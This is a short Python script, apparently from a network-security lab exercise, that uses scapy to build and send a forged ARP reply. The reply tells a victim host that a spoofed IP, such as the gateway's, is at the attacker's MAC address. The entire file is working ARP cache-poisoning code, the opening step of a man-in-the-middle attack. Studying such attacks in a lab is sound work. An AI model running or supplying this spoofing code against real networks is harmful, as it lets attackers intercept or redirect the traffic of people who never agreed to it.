#!/usr/bin/env python3
from scapy.all import *

# IP and MAC of the target (victim)
target_ip = "10.9.0.5"
target_mac = "02:42:0a:09:00:05"
# IP you are pretending to be (e.g., the gateway)
spoofed_ip = "10.9.0.17"
# Your attacking machine's MAC address
attacker_mac = "aa:bb:cc:dd:ee:ff"
# Create the spoofed ARP reply
arp_response = ARP(
    op=2,                        # 2 = ARP Reply
    psrc=spoofed_ip,             # Pretend to be this IP
    hwsrc=attacker_mac,          # Use attacker's MAC
    pdst=target_ip,              # Target's IP
    hwdst=target_mac             # Target's MAC
)

# Send the spoofed packet
send(arp_response, iface="eth0", verbose=False)  # Change iface to your actual interface
print(f"Spoofed ARP reply sent to {target_ip}, claiming {spoofed_ip} is at {attacker_mac}")
